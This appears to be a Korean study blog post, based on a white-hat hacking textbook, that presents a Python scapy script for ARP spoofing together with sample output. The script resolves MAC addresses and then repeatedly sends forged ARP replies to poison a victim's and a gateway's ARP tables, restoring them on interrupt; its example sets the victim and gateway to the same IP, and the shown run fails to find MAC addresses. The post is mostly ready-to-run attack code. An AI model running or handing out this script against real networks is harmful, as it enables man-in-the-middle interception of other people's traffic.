---
title: "Cryptography: 스푸핑"
last_modified_at: 2020-10-13T00:26:02-05:00
categories:
  - Cryptography
tags:
  - 암호학
  - 파이썬
  - 암호와 해킹 1판
toc: true 
toc_label: "Table of Contents"
toc_icon: "cog"
toc_sticky: true 
author_profile: true 
read_time: false 
---

`이 게시물은 화이트해커를 위한 암호와 해킹 1판을 참고하여 작성하였습니다.`

---
### 스푸핑을 구현해보자
---


```python
from scapy.all import *
from time import sleep
#from scapy.layers.12 import Ether, ARP

def getMAC(ip):
    ans, unans = srp(Ether(dst='ff-ff-ff-ff-ff-ff')/ARP(pdst=ip), timeout=5, retry=3)
    for s, r in ans:
        return r.sprintf('%Ether.src%')
        
def poisonARP(srcip, targetip, targetmac):
    arp=ARP(op=2, psrc=srcip, pdst=targetip, hwdst=targetmac)
    send(arp)
  
def restoreARP(victimip, gatewayip, victimmac, gatewaymac):
    arp1=ARP(op=2, psrc=gatewayip, pdst=victimip, hwdst='ff-ff-ff-ff-ff-ff', hwsrc=gatewaymac)
    arp2=ARP(op=2, psrc=victimip, pdst=gatewayip, hwdst='ff-ff-ff-ff-ff-ff', hwsrc=victimmac)
    send(arp1, count=3)
    send(arp2, count=3)

def main():
    gatewayip='192.168.0.17'
    victimip ='192.168.0.17'
    
    victimmac=getMAC(victimip)
    gatewaymac=getMAC(gatewayip)
    
    if victimmac == None or gatewaymac == None:
        print('MAC주소를 찾을 수 없습니다')
        return
    print('ARP Spoofing start -> Victim IP [%s]' %victimip)
    print('[%s]: Poison ARP Table [%s] -> [%s]' %(victimip, gatewaymac, victimmac))
    
    try:
        while True:
            poisonARP(gatewayip, victimip, victimmac)
            poisonARP(victimip, gatewayip, gatewaymac)
            sleep(3)
    except KeyboardInterrupt:
        restoreARP(victimip, gatewayip, victimmac, gatewaymac)
        print('ARP Spoogin done -> Restored ARP Table')
        
if __name__ == '__main__':
    main()
```
```
Begin emission:
....................................................................................................................................Begin emission:
...........................................Begin emission:
................Begin emission:
........
Received 199 packets, got 0 answers, remaining 1 packets
Begin emission:
........Begin emission:
........Begin emission:
.........Begin emission:
..
Received 27 packets, got 0 answers, remaining 1 packets
MAC주소를 찾을 수 없습니다
```